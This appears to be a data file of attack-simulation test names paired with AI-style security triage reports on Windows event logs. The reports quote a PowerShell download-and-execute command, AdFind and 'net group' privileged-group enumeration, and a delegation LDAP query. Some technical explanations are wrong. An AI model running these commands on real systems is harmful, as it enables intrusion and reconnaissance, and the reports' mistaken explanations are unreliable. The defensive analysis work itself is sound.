   - Multiple entries for common Windows services (`wuauclt.exe`, `CompatTelRunner.exe`) could reflect legitimate update and telemetry tasks. These entries are benign in isolation but should be monitored for consistency with legitimate update schedules, especially `CompatTelRunner.exe` due to telemetry transmission.
   
### Assessment:

- Several log entries illustrate usual system processes and user actions, but the repeated failed credential access combined with elevated privileges and command-line tool usage necessitates a meticulous investigation.

- Although the logs show signs of potentially unauthorized credential probing and elevated privileges for system processes, there is insufficient evidence in the provided logs to definitively conclude a malicious event or compromise has occurred.

### Guidance:

1. **Review and Audit Access Logs**: Conduct a thorough audit of access logs to determine if `MicrosoftAccount:user=02txoixylodcstop` has any recent changes or failed access history. Consult IT or security teams on any suspected anomalies.

2. **User Action Monitoring**: Keep track of the actions executed by `SERVER002\admin_test`, focusing on the reasoning behind using utility tools and potentially elevating privileges.

3. **System and User Policy Verification**: Ensure that elevated privileges and tool usage in the system align with organizational policies and conduct checks for approval of such activities.

4. **Network and Process Audit**: As there are network-related commands involved (`nltest.exe`), ensure network configuration is intact and validate that it is not part of unauthorized information discovery.

### Conclusion:

Given the available data, this situation is best classified as **SUSPICIOUS**. There are indicators of activities (e.g., repeated credential access failures, use of network diagnostic utilities) that necessitate further investigation to determine intent and scope."
GetCurrent User with PowerShell Script,"Upon reviewing the provided event logs, the following observations can be made:

### Findings:

1. **Security Log:**
   - **Event ID 4624 (Logon Success):** 
     - A logon event with Logon Type 5 indicates a service started by Services Control Manager. This is a common event and typically benign.
   - **Event ID 4672 (Special Privileges Assigned):** 
     - The SYSTEM account received several high-level privileges including `SeDebugPrivilege`, which could be potentially abused if misconfigured or accessed maliciously. However, this alone is not necessarily an indicator of compromise as SYSTEM accounts typically have high privileges.
   - **Event IDs 5379 (Credential Manager):**
     - Numerous entries with a `ReturnCode` of 3221226021 (STATUS_NO_SUCH_LOGON_SESSION) suggest failed operations to retrieve credentials, related to a process with ClientProcessId of 1732. This might indicate automated attempts or misconfigurations, needing further investigation of process ID 1732.

2. **System Log:**
   - No anomalies were detected in the System log entries. The logs mostly pertain to system-related operations like registry changes and Windows Defender updates.

3. **Windows PowerShell Log:**
   - Several PowerShell sessions were recorded showing the execution of a command that outputs the current user's security principal to a file (`CurrentUserObject.txt`). This operation could be part of a legitimate script or administrative task, but it could also be a method used by attackers to ascertain and escalate privileges. Needs further inspection on why and who initiated this.

4. **Sysmon Log:**
   - **Multiple instances of `wevtutil.exe` and `conhost.exe` executed by `SERVER002\admin_test`:** 
     - Elevated privileges are normal during administrative tasks, but repeated use of `wevtutil.exe` without context could indicate log manipulation or reconnaissance activities.
   - **Execution of utilities (`whoami.exe`, `hostname.exe`, `powershell.exe`, `svchost.exe`):**
     - These tools are commonly used for environment discovery and should be benign if used by an admin. However, their presence along with logs suggesting credential attempts raises suspicion regarding their purpose.
   - **Microsoft Edge Update Process:**
     - The process logs indicate a legitimate software update operation without any indicators pointing towards malicious activities.

### Assessment:

- The series of events, particularly:
  - The attempted usage of Credential Manager with no credentials returned.
  - The execution of various PowerShell and system utilities.
  - The presence of high-level privileges assigned to SYSTEM by default.
  
  These raise potential red flags that merit further investigation but do not immediately confirm malicious intent. The behavior in the logs could be indicative of lateral movement attempts or reconnaissance if done without proper administrative awareness.

### Resolution:

**SUSPICIOUS** - The activity captured in the logs suggests unusual behavior that deviates from normal operations and merits additional scrutiny. It is advisable to:

1. **Investigate Process ID 1732:** Determine what initiated credential manager operations with no success.
2. **Analyze PowerShell Usage:** Ensure the command-line operations correspond to expected administrative tasks. Verify no unintended scripts or commands are being executed.
3. **Check Account Usage:** Validate `admin_test` account activities against known tasks and review any changes in permissions or roles.
4. **Monitor for Anomalies:** Continue observing logins and system events for unusual patterns.

These steps will help ascertain if the activities are legitimate or signs of compromise and aid in identifying any security posture adjustments needed."

### Analysis:

1. **Security Log Events (EventID: 4624, 4672, 4798, 5379):**
   - **EventID 4624 (Logon Event):** Multiple logins by ""SYSTEM"" utilizing the ""Advapi"" logon process with ""LogonType"" 5 (service logon). This is typical behavior for services restarting or performing routine updates.
   - **EventID 4672 (Special Privilege Assigned to New Logon):** ""SYSTEM"" user granted various high-level privileges such as SeDebugPrivilege. While normal for ""SYSTEM,"" it requires attention in the broader context.
   - **EventID 4798 (Account Enumeration):** Repeated attempts by ""SERVER002$"" to enumerate groups, possibly indicating a script or scheduled task execution.
   - **EventID 5379 (Credential Validation):** Failed attempts for ""MicrosoftAccount:user=..."" due to a specific return code (3221226021), indicating issues or changes in accessing specific account credentials, which might be harmless but should be verified.

2. **Sysmon Log Events (EventID: 1, 5):**
   - **EventID 1 (Process Creation):** Notably, an instance of ""cmd.exe"" executed with the command-line input involving ""AdFind.exe,"" which is often used in reconnaissance to query Active Directory structures. This is indicative of potential data enumeration or investigation tool usage by an admin or attacker.
   - **EventID 5 (Process Termination):** Frequent termination of ""wevtutil.exe"" used for event log management, and ""conhost.exe"" associated with command prompt operations. Admin tasks can include actions with these executables, but if done excessively, it could signal log tampering or data exfiltration attempts.

3. **Application Log Events:**
   - Reports on routine service stops and starts, along with consistent Windows Defender status indicating no interruptions or disables, pointing to a benign environment from a defender standpoint.

4. **PowerShell and System Logs:**
   - No notable entries were provided, implying no significant PowerShell scripting events or critical system changes.

### Assessment of the Situation:
- The presence of ""AdFind.exe"" suggests reconnaissance activities, possibly for mapping out the network or extracting data on user accounts.
- Frequent attempts to read Windows Live Token and Microsoft accounts with return codes suggest automation scripts or an application malfunction, which could be normal or warrant concern.
- No explicit signs of a privilege escalation beyond typical service and system account behaviors.

### Threats or Risks Identified:
- **Reconnaissance:** The use of AdFind could indicate an attacker is probing the environment.
- **Automated Account Enumeration or Failure:** Could potentially represent ongoing script execution intended to gather account-related data.
  
### Guidance on How to Proceed:
1. **Further Investigation:**
   - Verify the source and authorization of the AdFind execution, confirming it is within the bounds of expected administrative practices.
   - Investigate and verify the legitimacy of accounts and credentials involved in the processed events, especially focusing on any third-party scripts or applications.
  
2. **User and Process Monitoring:**
   - Implement enhanced monitoring on the SYSTEM user account and associated processes to look out for unusual, unauthorized access or changes.
   - Configure alerts for repetitive and unusual activities on AD-related tools and services.

### Resolution:
Given the findings, especially the command-line operations executing AdFind, the situation elevates beyond benign routine operations:

**Resolution: SUSPICIOUS** 

Further investigation is necessary to confirm or rule out malicious intent or unauthorized use of administrative tools and scripts."
Suspicious LAPS Attributes Query with Get-ADComputer all properties,"**Analysis of Logs:**

1. **Unusual Process Execution and Command-Line Activity:**
   - Repeated execution of `wevtutil.exe` and `conhost.exe` by the user `SERVER002\admin_test` within a short time frame. This might suggest script or batch file execution to query or clear the event logs, which is sometimes employed by threat actors to hinder detection.
   - Use of `PowerShell` with command `powershell.exe & {script $env:computername -Properties *}` indicates an attempt to gather system information. This usage is suspicious as it’s a common tactic used in reconnaissance by attackers.

2. **Indicator of Potential Malicious Activity:**
   - The execution of `whoami.exe` suggests privilege checking or escalation attempt, a common step during the lateral movement or initial reconnaissance phase of an attack.
   - High integrity levels for processes such as PowerShell and `whoami.exe` indicate they are running with elevated privileges, which can be exploited during a compromise.

3. **Consideration of Other Logs:**
   - Various `MicrosoftEdgeUpdate.exe` processes are running as `NT AUTHORITY\SYSTEM`, with no obvious signs of modifications or exploitation.
   - Regular `svchost.exe` activity, likely related to system services, doesn't present any obvious anomalies in these events. 

**Assessment and Risks Identified:**

- The execution patterns involving `wevtutil.exe`, `conhost.exe`, `PowerShell`, and `whoami.exe`, especially when run by an administrator-level account, could be consistent with techniques associated with clearing logs and gathering system information in preparation for or during an attack.
- Such actions are not typical for regular administrative duties unless specifically authorized for audit or script execution purposes, hinting at potential unauthorized or malicious activity.

**Guidance:**

- Review user `SERVER002\admin_test` activities for any deviations from typical behavior or authorized tasks.
- Conduct further investigation relating to any downloaded or executed scripts and validate the origin of these commands.
- Use threat intelligence to check hashes involved in the listed processes against any known malicious signatures.
- Strengthen security monitoring and alerts around PowerShell and command-line tool usage, especially by privileged accounts.
- Conduct a security review of network traffic logs for unusual outbound connections at the corresponding time stamps.

**Resolution:**

- **SUSPICIOUS** - The logs contain activity that seems suspicious due to the nature of the executed commands and the elevated privileges used, warranting further investigation for potential unauthorized access or malicious intent."
Suspicious LAPS Attributes Query with adfind all properties,"Upon review of the provided logs, several observations can be made with regard to potential indicators of compromise:

1. **Frequent Execution of `wevtutil.exe` and `conhost.exe`:**
   - The `wevtutil.exe` utility, typically used for managing Windows Event logs, appears multiple times across the logs, executed by the user `SERVER002\admin_test`. This is coupled with instances of `conhost.exe`, which usually serves as a console host for command-line applications.
   - While the usage of `wevtutil` is not inherently suspicious, the frequent and rapid invocation, especially in tandem with console host bindings (`conhost.exe`), could indicate attempts to read or clear event logs, which is behavior typical of someone trying to cover their tracks.

2. **Execution of `powershell.exe` with Suspicious Script:**
   - An event shows `powershell.exe` executing with a command line that calls `AdFind.exe` from a non-standard directory. `AdFind` is an external tool often used for Active Directory reconnaissance. The execution from a temporary directory is suspicious, as it suggests potential enumeration or reconnaissance behavior which may not be legitimate.
   - The PowerShell execution and invocation of `AdFind.exe` warrant further investigation to determine the intent and legitimacy of these actions.

3. **Typical Administrative Utilities Usage:**
   - The logs include entries for `hostname.exe` and `whoami.exe` executions, which are commonly used for querying system information. Although indicative of preliminary reconnaissance, without further context, these do not conclusively point to malicious activity.
   
4. **High Integrity Level and Administrative Execution Context:**
   - The processes, particularly the ones with potentially malicious intent (e.g., PowerShell with `AdFind`), are running with high integrity, usually indicating administrative privileges. This raises potential security risks if the actions are indeed malicious.
   
5. **Time Synchronization Events:**
   - Several logs involving changes in system time (`EventID: 1` from `Microsoft-Windows-Kernel-General`) are observed. This might be a legitimate adjustment, but could also potentially indicate tampering to affect time stamps on logs.

6. **Scheduled Tasks and Updates:**
   - Logs include entries related to service-style applications (e.g., `svchost.exe`, `sppsvc.exe`, and `MicrosoftEdgeUpdate.exe`) running under SYSTEM or NETWORK SERVICE, which are typical and expected in the context of Windows system maintenance and updates.

**Assessment:**
The utilization of `AdFind.exe` via PowerShell indicates potentially unauthorized directory service enumeration. Coupled with the repeated usage of `wevtutil.exe`, these events suggest a degree of suspicious activity. However, due to the lack of direct evidence pointing to intentional malicious actions or breach-related behavior, the observed activities should be marked for further investigation.

**Resolution: SUSPICIOUS**
 
**Recommended Actions:**
- Audit the account activities of `SERVER002\admin_test` to determine if the user intended to perform these activities.
- Verify the origin and purpose of the PowerShell script invoking `AdFind.exe` from a temporary directory.
- Check for additional context or external correlations that might reveal any further indicators of compromise.
- Ensure that logging mechanisms capture clear records of these and future administrative operations for better monitoring.

Continued monitoring and a more comprehensive threat-hunting process should be conducted to ascertain the legitimacy or potential threat level of the activities observed."
Enumerate Active Directory for Unconstrained Delegation,"To provide a comprehensive analysis of the Windows event logs provided, let's go through each segment:

### Windows PowerShell Log

The logs show multiple instances of a PowerShell command being executed:

- **Command**: `Get-ADObject -LDAPFilter '(UserAccountControl:1.2.840.113556.1.4.803:=524288)' -Server $env:UserDnsDomain`
- **Description**: This command attempts to query Active Directory objects where the `UserAccountControl` flags indicate that the accounts are covered by certain conditions.
- **Usage Context**: This type of query can be used for legitimate administrative purposes, such as gathering information about locked or disabled accounts. However, it also fits a reconnaissance step often used by attackers to map out sensitive accounts in a target environment.

### Application Log

- **Events**:
  - **Edge Update Service Stopped**: This is routine and likely system maintenance or Edge browser updates.
  - **Microsoft-Windows-Security-SPP Event**: The Software Protection Platform (SPP) involves licensing verification and software integrity checks. Nothing unusual or directly suspicious on its own in this context.

### Sysmon Log

- **Process Creation**:
  - **PowerShell Execution**: Matches the PowerShell logs. The command executed appears relatively common in administrative scripts but can be used for reconnaissance if the source of execution is suspected.
  - **Frequent Execution of System Utilities**: We see processes like `conhost.exe`, `wevtutil.exe`, `wermgr.exe`, and `whoami.exe`. While these are common system utilities, frequent execution in close succession may indicate attempts to interact with system logs, observe user details, or manage event logs — actions that can be associated with an attacker covering tracks or gaining system insights.
  - **EdgeUpdate and its Helper Execution**: Mostly benign, indicating routine checks and updates to the browser component.
  - **Taskhostw Process**: It's a core Windows process for executing DLL tasks; no suspicious activity linked unless further evidence associates it with malicious actions.

### Overall Impression and Indicators:

1. **Anomalous PowerShell Activity**: While the PowerShell command can be legitimate, its origin on a high-profile user machine (such as a CEO) should not be dismissed, particularly if similar queries are not part of routine checks from this user.
   
2. **System Utility Execution**: The use of utilities like `whoami`, `wevtutil`, and `conhost` suggests a potential for monitoring user identities or managing event logs, which could suggest spying or track-covering activity.

### Assessment:

- **Resolution: SUSPICIOUS**: The behaviors observed are suspicious due to the context of occurring on a CEO's machine. The PowerShell command, often benign, could indicate unauthorized reconnaissance if not part of regular admin tasks. The use of system tools in close succession and the unnecessary detail from command executions warrant further investigation.

### Recommendations:

- **Further Investigation**: Verify if the PowerShell commands were executed intentionally by the administrator or the CEO for legitimate purposes.
- **User Interaction Check**: Confirm with the user or related IT admin whether these system utilities were executed as part of known troubleshooting or admin scripts.
- **EDR Deep Dive**: Utilize Endpoint Detection and Response (EDR) tools to further investigate other signs of compromise or additional context around these events.
- **Audit and Monitor**: Increase the monitoring level on the CEO's machine and related accounts for any further anomalous behavior.
- **Security Review**: Conduct a review of security policies to ensure such potentially sensitive queries are under strict control and logging."
Discover System Language by Windows API Query,"Based on the analysis of the provided Windows event logs, here's the detailed assessment:

1. **Event ID 4624 (Logon Success)**: Multiple logon events with ID 4624 are observed. The logon type 5 indicates a service logon, which often occurs in a normal environment when system services start.

2. **Event ID 4672 (Special Privileges Assigned)**: This event indicates special privileges being assigned to the user SYSTEM, which is common in normal operations for system accounts.

3. **Event ID 5379 (Credential Validation Attempt)**: These events represent unsuccessful attempts to validate credentials using ""MicrosoftAccount"" and ""WindowsLive"", with the return code `3221226021` indicating ""The username or password is incorrect"". Such events are concerning as they imply potential bruteforce or unauthorized access attempts to validate or enumerate accounts.

4. **Event ID 4798 (Query User Accounts)**: Several 4798 events show the system querying properties of various user accounts (e.g., Administrator, Guest). This can happen in legitimate activities, such as administrative tasks or system checks, but it can also be indicative of enumeration activity by an attacker.

5. **Sysmon Logs - Process Creation (Event ID 1) and Process Termination (Event ID 5)**:
   - **Presence of `LanguageKeyboardLayout.exe`**: Its execution from the `Temp` directory with unusual paths hints at potentially malicious activity. This could be indicative of a deployment of an unauthorized or potentially malicious software that is evading typical directory protections. The `cmd.exe` is used to execute this, raising suspicion.
   - Common administrative binaries (`HOSTNAME.EXE`, `whoami.exe`) executed by `admin_test` can hint at reconnaissance activities.
   - Use of `wevtutil.exe` and `conhost.exe` can be related to actions by administrative tools or scripts but, in suspicious contexts, could also indicate attempts to manipulate logs or track user identity.

### Assessment:

The sequence of events, particularly the failed credential validation attempts paired with querying user account properties and the execution of unusual binaries like `LanguageKeyboardLayout.exe`, suggests activities that merit close scrutiny. These indicators can be interpreted as:

- **Potential Reconnaissance/Enumeration**: The use of system tools to identify system capabilities and configurations. This could be a part of regular administrative tasks or early-stage reconnaissance by an attacker.
- **Malware Execution/Installation**: The execution of a binary from the `Temp` directory is suspicious and could indicate attempted installation of a malware or unauthorized application.

Despite the presence of standard activities (such as service logons), these logs contain several potentially malicious activities that require further investigation, such as examining the context of `admin_test` activities, the origin of failed credential attempts, and analyzing the suspicious executable for any malicious payloads.

### Resolution: **SUSPICIOUS**

Given the presence of potentially unauthorized access attempts and unusual process executions, it is recommended to further investigate these findings to confirm or rule out a potential compromise. Immediate steps should include:
- Monitoring and restricting the account `admin_test` to prevent further actions if suspicious.
- Scanning the host for malware using updated security tools.
- Enhancing logging and monitoring for unusual login attempts.
- Verifying the integrity and origin of `LanguageKeyboardLayout.exe` and other suspicious processes.

Further measures may include reaching out to the user for verification and possibly conducting a full forensic investigation if required."
Detect a Debugger Presence in the Machine,"Upon reviewing the provided logs across multiple channels (System, Windows PowerShell, Security, Sysmon, and Application), here is the detailed analysis:

### Observations:

1. **System Log and Security Log:**
   - The logs indicate some changes in system time with events 4616 (Security log) and 1 (Kernel-General - System log). These logs highlight that `svchost.exe` was responsible for the time change. 
   - Both old and new times are very close, which may indicate a minor correction.
   - No abnormality or malicious behavior was immediately evident tied to these time change events.

2. **Windows PowerShell Log:**
   - Multiple entries of PowerShell activities with host applications attempting to check for debugger processes and debugging flags (`$debuggerProcesses` and `$debuggingFlags` variables). This is potentially suspicious as such scripting can be leveraged by malware to detect whether it's running in a sandbox or debugger environment.
   - No specific harmful command execution is shown but warrants further investigation into the purpose of these scripts.

3. **Security Log:**
   - Logon and privilege escalation activities are seen with user `admin_test`. Event ID 4672 shows this user receiving a number of high-privilege tokens which include `SeDebugPrivilege`. This is common for admin accounts but is noteworthy when paired with suspicious activity like the PowerShell script checking for debuggers.

4. **Sysmon Log:**
   - Frequent invocations of `MicrosoftEdgeUpdate.exe`, along with various command-line flags like `/svc`, `/c`, `/regsvc`, etc. These flags are typical for legitimate update processes.
   - Processes such as `whoami.exe` are running under high integrity, indicating that potentially administrative checks were being made by the user `admin_test`.
   - It is usual for system services and update processes to have multiple entries, but the timing and sequence are worth correlating with user activities, especially when considering the PowerShell activities.

5. **Application Log:**
   - Standard service stops for Edge Update are logged, which corresponds with Sysmon logs.

### Assessment:

- **Suspicious Aspects:**
  - The use of PowerShell to check for debuggers is a strong indicator of potentially suspicious behavior. This activity is commonly associated with scripts trying to identify security environments to decide on their execution plan.
  - Receiving high-privilege rights by `admin_test` is suspicious when combined with the examination for debuggers.
  
- **Benign Aspects:**
  - Time synchronization activities and frequent `MicrosoftEdgeUpdate.exe` entries appear to align with intended operational activities, unless notably misaligned with user action timelines or typical operation schedules.

### Final Determination:
Based on the analyzed logs, the overall activity can be concluded as **SUSPICIOUS** due to PowerShell scripts checking for debugger processes and the privilege escalation observed. These actions merit a deeper investigation, particularly around the purpose and origin of the PowerShell scripts, and verification of the legitimacy of time changes.

### Guidance:
- Conduct a thorough review of `PowerShell` command logs or scripts executed to identify any unauthorized or malicious scripting.
- Verify `admin_test` account activities and if the privilege escalations observed coincide with their legitimate actions.
- Check additional security logs beyond the provided timeframe to identify any correlation with other suspicious activities.
- Consider procuring forensic artifacts like memory dumps if further suspicious activities are discovered."
User Discovery With Env Vars PowerShell Script,"Based on my analysis of the provided logs across multiple event channels, I have identified the following key points of interest:

1. **Security Logs (Event ID 5379):**
   - These events suggest credential access attempts related to MicrosoftAccount and WindowsLive, all returning the code `3221226021`, indicating access denial. This appears to be repeated multiple times.

2. **Sysmon Logs:**
   - The execution of `whoami.exe`, `hostname.exe`, and `wevtutil.exe` by the user `SERVER002\admin_test` is benign if these actions are initiated by legitimate users. However, the repetitive and automated-like execution of `whoami.exe` paired with commands writing to the `CurrentactiveUser.txt` file via PowerShell is unusual.
   - The execution of PowerShell with a script writing environment variables like `UserName` to a file is notable for potential espionage or preparation for further actions, particularly in a temporary directory. 

3. **Application Logs:**
   - Windows Defender security product state is active, indicating some level of protection is in place.

4. **System Logs:**
   - Normal logging activity related to system updates and components is observed.

5. **Windows PowerShell Logs:**
   - A sequence of PowerShell events revolves around collecting and exporting the username to a text file, which is abnormal activity for legitimate processes.

### Assessment:

Based on these observations, the execution of legitimate Windows binaries like `whoami.exe` alongside PowerShell scripts in what seems to be an automation or script to gather system user information and store it locally is suspicious. The context suggests potential reconnaissance or the use of living-off-the-land techniques common in post-exploitation scenarios.

### Conclusion:
- **Resolution:** SUSPICIOUS

### Guidance:
1. **Further Investigation:**
   - Review other logs and system changes around the identified timestamps to ascertain the complete scope of the automation/script execution.
   - Check for other suspicious activity or unauthorized user accounts that might indicate the presence of an adversary.
   - Verify the origin of the process initiation, especially if remote administration tools or scripts were used.

2. **Immediate Actions:**
   - Isolate the affected system if further investigation supports evidence of unauthorized activity.
   - Perform a full malware scan and inspect the PowerShell scripts for any malicious intent.
   - Engage with the user, particularly since it’s the CEO’s machine, to clarify any legitimate necessity for such scripts or tools.

3. **Long-term Actions:**
   - Implement enhanced logging and alerting for similar PowerShell behavior across other endpoints.
   - Educate users on identifying and reporting suspicious activity initiated from their accounts."
File and Directory Discovery (PowerShell),"**Detailed Analysis of the Provided Logs:**

1. **Sysmon Logs:**
   - A recurring pattern of processes such as `wevtutil.exe` and `conhost.exe` executed by the user `SERVER002\\admin_test` is observed. While `wevtutil.exe` is a legitimate Windows utility used for managing event logs and `conhost.exe` is a console window host process, their frequent and rapid execution could be suspicious if not part of routine administrative actions. However, without further context like frequency over time or correlation with known malicious patterns, this alone does not indicate malicious intent.
   - The presence of a PowerShell process (`powershell.exe`) running potentially obfuscated or unusual command lines (`ls -recurse, get-childitem -recurse, gci -recurse`) is notable. This command seeks to list files recursively, which could be legitimate for inventory purposes but could also indicate data gathering for exfiltration.

2. **System Logs:**
   - Numerous kernel-general events and adjustments in the system time (`NewTime` and `OldTime`) are observed. Time changes without administrative intent can be an indicator of attempts to manipulate system logs and timestamps, which is suspicious behavior.

3. **PowerShell Logs:**
   - PowerShell execution with commands aimed at file enumeration (`ls -recurse`, `get-childitem`) supports potential data reconnaissance efforts. This could be part of a larger script or manual administration; however, without a known task for such actions, it remains suspicious.

4. **Security Logs:**
   - Event ID 4616 shows time change events carried out by the `SYSTEM` account involving `svchost.exe`. Time changes are logged through security auditing and could be attempts to cover tracks or adjust the system clock for aligning timestamps.

5. **Application Logs:**
   - These logs contain typical entries related to software protection, with no direct indication of malicious activities.

**Assessment:**

- The logs exhibit behavior that is indicative of suspicious activity, predominantly due to the combination of rapid and repeated execution of utilities like `wevtutil.exe`, the commencement of pervasive PowerShell commands, and the alteration of system time. While individually these activities can be legitimate, their occurrence under circumstances explained could imply possible reconnaissance or preparation for further malicious activities.

**Identified Threats and Risks:**

- Potential misuse of system tools for reconnaissance or exfiltration.
- Tampering with system time to confuse forensics or alerting mechanisms.
- Elevated risk of escalated privileged actions or log manipulation.

**Guidance on How to Proceed:**

1. **Conduct Further Investigation:**
   - Verify any legitimate reasons for the PowerShell commands and system-time changes.
   - Review user activity logs and administrative actions to check if these were authorized.
   - Validate if the systems involved were part of any recent administrative changes.

2. **Monitor Network and System Activities:**
   - Implement tighter monitoring on similar PowerShell activities and the use of Windows utilities.
   - Increase scrutiny of server activities, focusing on users with administrative privileges.

3. **Perform Threat Hunting:**
   - Use the identified patterns as IOCs (Indicators of Compromise) for threat hunting across the environment.

**Resolution: SUSPICIOUS**

The logs contain activity that appears unusual and warrants further investigation to rule out or confirm a potential security breach."
Elevated group enumeration using net group (Domain),"### Detailed Analysis of the Logs

After a thorough review of the provided Windows event logs, I have identified several activities of interest that stand out, warranting a closer examination:

1. **Process Executions Related to Microsoft Edge Updates:**
   - There is a sequence of events involving the execution of various components related to Microsoft Edge updates. These include `MicrosoftEdgeUpdateComRegisterShell64.exe`, `MicrosoftEdgeUpdate.exe`, and other associated installers and executables. This appears to be part of routine software maintenance and updates, given the legitimate file paths, descriptions, and verifiable file hashes. Thus, these entries do not exhibit any traits typically associated with malicious behavior.

2. **Whoami and Hostname Commands:**
   - The execution of `whoami.exe` and `hostname.exe` by the user `SERVER002\admin_test` is observed multiple times. On its own, this activity can be benign, as these commands are frequently used for inventory or scripting purposes. However, their occurrence within a potential illicit context could require further scrutiny to ensure no misuse of account privileges is happening.

3. **Unusual Command-Line Activity:**
   - One notable element is the command-line execution seen in Event ID 18003 with `cmd.exe`. The command attempts to query various network groups, such as ""Account Operators,"" ""Domain Admins,"" and others, using the `net group` command. This activity is often associated with reconnaissance actions performed by attackers to enumerate group memberships and assess account privileges. The process is initiated by the user `SERVER002\admin_test`, who has an Elevated Token (indicating high privileges).

4. **Use of `wevtutil.exe`:**
   - The `wevtutil.exe` is being executed, which can be a part of legitimate administrative tasks related to event log querying or clearing. However, repeated execution in rapid succession might indicate attempts to tamper or erase event logs, which could be part of anti-forensics actions by a malicious actor.

5. **Security Audit Events:**
   - The Security log contains an event with ID 4672, where the privileges associated with the `SERVER002\admin_test` account include high-level administrative capabilities such as `SeDebugPrivilege` and others. While these privileges can be legitimate for certain administrative users, the use and context are crucial in determining the benign or malicious nature of associated activities.

### Assessment

Taking into consideration the combination of suspicious command line usage, the enumeration of sensitive group memberships, and the privileges associated with the `admin_test` account, there is a significant indication of potential unauthorized activity on the system. Specifically, the group enumeration command suggests possible reconnaissance efforts.

### Threats and Risks Identified

- **Potential Internal Reconnaissance:** The querying of administrative groups can imply preparation for privilege escalation or lateral movement activities within the network.
- **Potential Anti-Forensics:** Multiple executions of `wevtutil.exe` could indicate log tampering efforts, often attempted by malicious actors to cover tracks.

### Guidance on How to Proceed

1. **Conduct a Full Investigation:**
   - Investigate the origin and intent behind the `admin_test` user’s activities.
   - Verify the legitimacy of all executed commands and processes by correlating them with authorized administrative tasks or known change control records.

2. **Enhanced Monitoring:**
   - Enable detailed logging for the `admin_test` account and any other accounts with elevated privileges.
   - Employ network-based monitoring to detect and alert on any similar group enumeration activities or other suspicious command-line executions.

3. **Restrict Privileges:**
   - Review and potentially limit privileges assigned to administrative accounts that are not in line with the principle of least privilege.

4. **Incident Response:** 
   - Prepare to escalate this activity as a potential incident requiring active response and containment measures, such as isolating the host if further malicious indicators are found.

### Resolution

Based on the available data, the logs reflect enough concerning activity to merit cautious interpretation and further investigation. Therefore, the final resolution is:

**SUSPICIOUS** - The logs contain activity that doesn't look right and needs more investigation."
WinPwn - powerSQL,"Upon reviewing the provided logs, a number of activities and events stand out:

1. **PowerShell Execution**: There is evidence of PowerShell script execution that downloads and executes a script from an external source: `https://raw.githubusercontent.com/script/script/121dcee26a7aca368821563cbe92b2b5638c5773/script.ps1`. This kind of behavior is often indicative of a script being executed from an untrusted source and could potentially be malicious.

2. **Process Anomalies**: Several processes were observed:
   - Execution of `wevtutil.exe` and `conhost.exe` with multiple instances close together in time.
   - Use of `whoami.exe` and `hostname.exe`, which might relate to information-gathering operations.
   - A command using Windows PowerShell to execute a downloaded script.
   
3. **Command Line Information**:
   - The command line details for PowerShell (`""powershell.exe"" & {$script_repo='https://raw.githubusercontent.com/script'...`) strongly suggest that this was a deliberate script execution for automation or lateral movement.
    
4. **Elevation of Privileges**:
   - The security logs show events (Event ID 4672) where privileges such as `SeDebugPrivilege` and `SeImpersonatePrivilege` were assigned, which could be used for privilege escalation or process injection by an attacker.

5. **Network and System Changes**:
   - The event logs show actions typical when a system is preparing to perform updates or reporting diagnostic data (`UsoClient.exe`, `CompatTelRunner.exe`). However, without more context, this might fit regular system behavior.

6. **Sysmon Entries**:
   - Numerous entries for the execution of `svchost.exe` and kernel processes look like standard system operations under the 'SYSTEM' account.

Given the above findings, particularly the PowerShell command aiming to fetch and run scripts from an external source without verification, shows significant evidence of potentially malicious activity or compromise. The privilege escalation operations further reinforce these concerns. The specific sequence of events is suspicious in the context of executing downloaded code.

**Resolution**: MALICIOUS

### Recommended Actions:
- Immediately isolate the affected machine from the network to prevent any further potential spread of malicious activity.
- Perform a thorough investigation focusing on network connections and data written by the PowerShell script.
- Review and block the IP or URL that was used for downloading the scripts.
- Conduct a malware scan on the system to identify any malicious artifacts or indicators of compromise.
- Reset credentials for accounts that were used during the suspicious activities.
- Implement monitoring for the execution of PowerShell with internet access and examine egress traffic logs to identify any unauthorized data exfiltration attempts.
- Strengthen policies for external script execution and enforce best practices around PowerShell script execution and logging."
System Owner-User Discovery,"After a thorough analysis of the provided logs about activity on the CEO's machine, several suspicious activities and events stand out. Below is a detailed breakdown, leading to a conclusive assessment.

### Key Observations:

1. **Security Logs (Event ID 4798):**
   - Multiple instances show the `admin_test` user querying membership of various user accounts including `Administrator`, `DefaultAccount`, `Guest`, and several others, within a very tight timeframe.
   - The Caller Process `WmiPrvSE.exe` is a legitimate Windows process, but it can be used for malicious purposes, especially in enumeration tasks indicative of reconnaissance activities.

2. **Sysmon Logs:**
   - Several instances of processes like `wevtutil.exe`, `conhost.exe`, and notably `cmd.exe` executing with command lines that suggest reconnaissance and possibly lateral movement attempts. The command line for `cmd.exe` includes a complex batch of commands suggesting enumeration of users and sessions on `localhost`, which is unusual for normal operations.
   - `WMIC.exe` and `WHOAMI.exe` commands were issued by the `admin_test` user, which align with the idea of exploring system information and user privilege checks.
   - The execution of `cmd.exe` with commands to gather user accounts and session information showcases an attempt to enumerate and potentially pivot within the environment.

3. **Windows Update and Application Logs:**
   - Regular updates and application security checks show the system's defenses (such as Windows Defender) are active and up-to-date, but this alone does not negate the suspicious activity observed elsewhere.

### Assessment:

The activities observed, namely the querying of user accounts and the execution of system enumeration commands from a potentially compromised account `admin_test`, indicate a likelihood of malicious reconnaissance behavior. The specific use and sequence of command executions strongly suggest exploration of the system environment and user privileges, typical of an early stage in a malicious attack vector.

### Conclusion:

Given these observations, the logs reflect:
- **Malicious Activity**: The scripted nature of commands, user enumeration, and usage of legitimate system utilities for suspicious purposes provide strong indicators of a system compromise attempt or reconnaissance phase of a cyber attack.

### Recommended Actions:

- **Immediate Containment**: Disable the `admin_test` account and any sessions associated with it to prevent further data exfiltration or lateral movement.
- **Comprehensive Audit**: Conduct a full audit of the system and network activities surrounding the times of these events for potential lateral movements and data access attempts.
- **Additional Monitoring**: Increase scrutiny on sysmon and security logs for similar patterns indicative of further reconnaissance or pivoting attempts.
- **Incident Response**: Engage incident response protocols to mitigate risk and secure potentially exposed systems.

Final Resolution: **MALICIOUS**"
WinPwn - GPORemoteAccessPolicy,"Upon analyzing the provided Windows event logs, several events may indicate malicious activity, especially from the PowerShell logs:

### Highlights of the Analysis:

#### Windows PowerShell Logs:
- There are multiple entries where PowerShell was started with a script execution command, particularly noting downloading and executing a script from the internet:
  - `powershell.exe & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/script/script/121dcee26a7aca368821563cbe92b2b5638c5773/script.ps1')}`
- This specific command execution pattern (downloading and invoking scripts directly from the internet) is a common vector for malware execution and is highly suspicious in a corporate environment unless specifically controlled and monitored.

